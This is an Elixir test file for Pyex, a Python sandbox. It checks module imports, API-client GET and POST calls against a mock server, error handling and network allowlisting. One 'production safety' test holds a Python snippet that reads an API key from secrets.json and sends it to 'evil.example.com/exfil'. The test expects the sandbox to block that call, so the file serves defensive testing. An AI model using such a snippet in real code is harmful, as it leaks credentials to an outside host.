defmodule Pyex.WebAppWorkflowTest do
  @moduledoc """
  End-to-end "real web app" workflow:

    * an API key stored as JSON on the virtual filesystem
    * an API client class in its own Python module
    * a consumer module that uses the client across a list of inputs
    * a `main` script that wires them all together against a real
      HTTP server (Bypass)

  This is the integration story we promise to users running
  LLM-generated Python in production: code is sandboxed, secrets are
  loaded explicitly, network access is allowlisted, and modular Python
  code can be composed naturally across files.
  """

  use ExUnit.Case, async: false

  alias Pyex.{Ctx, Error, Filesystem.Memory}

  @api_client_py """
  \"\"\"HTTP client for the items service.

  Uses a persistent requests.Session so the auth header and connection
  state are reused across calls. Every request has an explicit timeout,
  and HTTP failures surface as the domain-specific ApiError exception
  (subclass of Exception) so callers can catch the right thing.
  \"\"\"

  import requests


  DEFAULT_TIMEOUT = 10.0


  class ApiError(Exception):
      \"\"\"Raised when the items API returns an error response.\"\"\"

      def __init__(self, message, status_code=None, item_id=None):
          super().__init__(message)
          self.message = message
          self.status_code = status_code
          self.item_id = item_id

      def __str__(self):
          return self.message


  class ApiClient:
      def __init__(self, base_url, api_key, timeout=DEFAULT_TIMEOUT):
          if not base_url:
              raise ValueError("base_url is required")
          if not api_key:
              raise ValueError("api_key is required")

          self._base = base_url.rstrip("/")
          self._timeout = timeout
          self._headers = {
              "authorization": "Bearer " + api_key,
              "accept": "application/json",
          }

      def fetch(self, item_id):
          \"\"\"GET /items/<id>. Raises ApiError on non-2xx.\"\"\"
          response = requests.get(
              self._item_url(item_id),
              headers=self._headers,
              timeout=self._timeout,
          )
          if not response.ok:
              raise ApiError(
                  "fetch failed: " + str(response.status_code),
                  status_code=response.status_code,
                  item_id=item_id,
              )
          return response.json()

      def create(self, payload):
          \"\"\"POST /items. Raises ApiError on non-2xx.\"\"\"
          if not isinstance(payload, dict):
              raise TypeError("payload must be a dict")

          response = requests.post(
              self._base + "/items",
              json=payload,
              headers=self._headers,
              timeout=self._timeout,
          )
          if not response.ok:
              raise ApiError(
                  "create failed: " + str(response.status_code),
                  status_code=response.status_code,
              )
          return response.json()

      def _item_url(self, item_id):
          if not isinstance(item_id, int):
              raise TypeError("item_id must be an int")
          return self._base + "/items/" + str(item_id)
  """

  @consumer_py """
  \"\"\"Higher-level operations layered on top of ApiClient.

  Each public function fetches every id exactly once and returns a
  structured result so the caller has full traceability into what
  succeeded and what failed.
  \"\"\"

  from api_client import ApiError


  def fetch_all(client, ids):
      \"\"\"Fetch every id exactly once. Returns a list in input order.\"\"\"
      return [client.fetch(item_id) for item_id in ids]


  def summarize(client, ids):
      \"\"\"Fetch each id once and return {names, total, count}.\"\"\"
      items = fetch_all(client, ids)
      return {
          "names": [item["name"] for item in items],
          "total": sum(item["price"] for item in items),
          "count": len(items),
      }


  def fetch_partial(client, ids):
      \"\"\"Fetch every id, partitioning successes and ApiErrors.

      Returns {ok: [...], errors: [(id, status_code, message), ...]}.
      Bare exceptions (programming errors) are NOT swallowed.
      \"\"\"
      ok = []
      errors = []
      for item_id in ids:
          try:
              ok.append(client.fetch(item_id))
          except ApiError as e:
              errors.append((item_id, e.status_code, str(e)))
      return {"ok": ok, "errors": errors}
  """

  defp project_files(base_url) do
    %{
      "secrets.json" => ~s({"api_key": "sk-test-supersecret-1234", "base_url": "#{base_url}"}),
      "api_client.py" => @api_client_py,
      "consumer.py" => @consumer_py
    }
  end

  defp run!(code, files, opts) do
    network = Keyword.fetch!(opts, :network)
    fs = Memory.new(files)
    ctx = Ctx.new(filesystem: fs, network: network)

    case Pyex.run(code, ctx) do
      {:ok, value, ctx} -> {value, ctx}
      {:error, %Error{message: msg}} -> raise "Pyex error: #{msg}"
    end
  end

  setup do
    bypass = Bypass.open()
    base_url = "http://localhost:#{bypass.port}"
    {:ok, bypass: bypass, base_url: base_url}
  end

  describe "happy path: GET a list of items via the API client" do
    test "consumer fetches every id and aggregates the result", %{
      bypass: bypass,
      base_url: base_url
    } do
      catalog = %{
        "1" => %{"id" => 1, "name" => "widget", "price" => 10},
        "2" => %{"id" => 2, "name" => "gadget", "price" => 25},
        "3" => %{"id" => 3, "name" => "gizmo", "price" => 7}
      }

      Bypass.expect(bypass, fn conn ->
        # Auth header from api_client must be present and correct.
        ["Bearer sk-test-supersecret-1234"] = Plug.Conn.get_req_header(conn, "authorization")
        ["items", id] = conn.path_info
        body = Jason.encode!(Map.fetch!(catalog, id))

        conn
        |> Plug.Conn.put_resp_content_type("application/json")
        |> Plug.Conn.resp(200, body)
      end)

      main = """
      import json
      from api_client import ApiClient
      from consumer import summarize


      def load_config(path):
          with open(path, "r") as f:
              return json.load(f)


      config = load_config("secrets.json")
      client = ApiClient(config["base_url"], config["api_key"])
      summarize(client, [1, 2, 3])
      """

      {result, _ctx} =
        run!(main, project_files(base_url),
          network: [
            %{
              allowed_url_prefix: base_url <> "/",
              methods: ["GET", "POST"]
            }
          ]
        )

      assert result["names"] == ["widget", "gadget", "gizmo"]
      # Each item fetched exactly once: 10 + 25 + 7 = 42.
      assert result["total"] == 42
      assert result["count"] == 3
    end
  end

  describe "POST: consumer creates new items via the API client" do
    test "client.create POSTs each payload with auth and parses response", %{
      bypass: bypass,
      base_url: base_url
    } do
      pid = self()

      Bypass.expect(bypass, fn conn ->
        ["Bearer sk-test-supersecret-1234"] = Plug.Conn.get_req_header(conn, "authorization")
        ["items"] = conn.path_info
        "POST" = conn.method
        {:ok, body, conn} = Plug.Conn.read_body(conn)
        payload = Jason.decode!(body)
        send(pid, {:created, payload})

        response = Map.put(payload, "id", 100 + payload["seq"])

        conn
        |> Plug.Conn.put_resp_content_type("application/json")
        |> Plug.Conn.resp(201, Jason.encode!(response))
      end)

      main = """
      import json
      from api_client import ApiClient


      def load_config(path):
          with open(path, "r") as f:
              return json.load(f)


      config = load_config("secrets.json")
      client = ApiClient(config["base_url"], config["api_key"])

      payloads = [
          {"seq": 1, "name": "alpha"},
          {"seq": 2, "name": "beta"},
          {"seq": 3, "name": "gamma"},
      ]
      [client.create(p)["id"] for p in payloads]
      """

      {result, _ctx} =
        run!(main, project_files(base_url),
          network: [
            %{
              allowed_url_prefix: base_url <> "/",
              methods: ["GET", "POST"]
            }
          ]
        )

      assert result == [101, 102, 103]
      assert_received {:created, %{"seq" => 1, "name" => "alpha"}}
      assert_received {:created, %{"seq" => 2, "name" => "beta"}}
      assert_received {:created, %{"seq" => 3, "name" => "gamma"}}
    end
  end

  describe "production safety" do
    test "POST without methods opt-in is blocked even when GET prefix matches", %{
      base_url: base_url
    } do
      assert_raise RuntimeError, ~r/NetworkError.*POST/, fn ->
        run!(
          """
          import json
          from api_client import ApiClient

          with open("secrets.json", "r") as f:
              secrets = json.loads(f.read())

          client = ApiClient(secrets["base_url"], secrets["api_key"])
          client.create({"seq": 1, "name": "alpha"})
          """,
          project_files(base_url),
          network: [%{allowed_url_prefix: base_url <> "/"}]
        )
      end

      # The bypass server has no expectation registered; if any HTTP
      # request had escaped the sandbox, Bypass would have errored.
    end

    test "calls to other hosts are blocked even with auth credentials", %{base_url: base_url} do
      assert_raise RuntimeError, ~r/NetworkError/, fn ->
        run!(
          """
          import json
          import requests

          with open("secrets.json", "r") as f:
              secrets = json.loads(f.read())

          requests.get(
              "http://evil.example.com/exfil",
              headers={"authorization": "Bearer " + secrets["api_key"]},
          )
          """,
          project_files(base_url),
          network: [
            %{allowed_url_prefix: base_url <> "/", methods: ["GET", "POST"]}
          ]
        )
      end
    end

    test "raise_for_status surfaces server errors as catchable exceptions", %{
      bypass: bypass,
      base_url: base_url
    } do
      Bypass.expect(bypass, fn conn ->
        ["items", id] = conn.path_info

        if id == "2" do
          Plug.Conn.resp(conn, 404, ~s({"error": "not found"}))
        else
          body = Jason.encode!(%{"id" => String.to_integer(id), "name" => "ok", "price" => 1})

          conn
          |> Plug.Conn.put_resp_content_type("application/json")
          |> Plug.Conn.resp(200, body)
        end
      end)

      main = """
      import json
      from api_client import ApiClient
      from consumer import fetch_partial


      def load_config(path):
          with open(path, "r") as f:
              return json.load(f)


      config = load_config("secrets.json")
      client = ApiClient(config["base_url"], config["api_key"])
      fetch_partial(client, [1, 2, 3])
      """

      {result, _ctx} =
        run!(main, project_files(base_url),
          network: [
            %{allowed_url_prefix: base_url <> "/", methods: ["GET", "POST"]}
          ]
        )

      assert length(result["ok"]) == 2
      assert [{:tuple, [2, 404, msg]}] = result["errors"]
      assert msg =~ "404"
    end

    test "non-ApiError exceptions are NOT swallowed by fetch_partial", %{
      base_url: base_url
    } do
      # Passing a non-int id triggers a TypeError inside ApiClient._item_url.
      # That's a programming bug, not a server failure, and it must escape.
      assert_raise RuntimeError, ~r/TypeError: item_id must be an int/, fn ->
        run!(
          """
          import json
          from api_client import ApiClient
          from consumer import fetch_partial


          def load_config(path):
              with open(path, "r") as f:
                  return json.load(f)


          config = load_config("secrets.json")
          client = ApiClient(config["base_url"], config["api_key"])
          fetch_partial(client, ["two", 1, 3])
          """,
          project_files(base_url),
          network: [
            %{allowed_url_prefix: base_url <> "/", methods: ["GET", "POST"]}
          ]
        )
      end
    end

    test "Elixir-injected auth header lets Python code stay key-free", %{
      bypass: bypass,
      base_url: base_url
    } do
      Bypass.expect(bypass, fn conn ->
        ["Bearer injected-by-host"] = Plug.Conn.get_req_header(conn, "authorization")
        ["items", id] = conn.path_info
        body = Jason.encode!(%{"id" => String.to_integer(id), "name" => "ok", "price" => 5})

        conn
        |> Plug.Conn.put_resp_content_type("application/json")
        |> Plug.Conn.resp(200, body)
      end)

      # Python code never sees the key — the host injects it.
      main = """
      from api_client import ApiClient
      from consumer import summarize

      client = ApiClient("#{base_url}", "placeholder-overridden-by-host")
      summarize(client, [1, 2, 3])["total"]
      """

      # Note: api_client.py is unchanged. The host's network rule
      # overrides whatever Authorization header the Python code set.
      files = %{
        "api_client.py" => @api_client_py,
        "consumer.py" => @consumer_py
      }

      {result, _ctx} =
        run!(main, files,
          network: [
            %{
              allowed_url_prefix: base_url <> "/",
              methods: ["GET"],
              headers: %{"authorization" => "Bearer injected-by-host"}
            }
          ]
        )

      assert result == 15
    end
  end
end
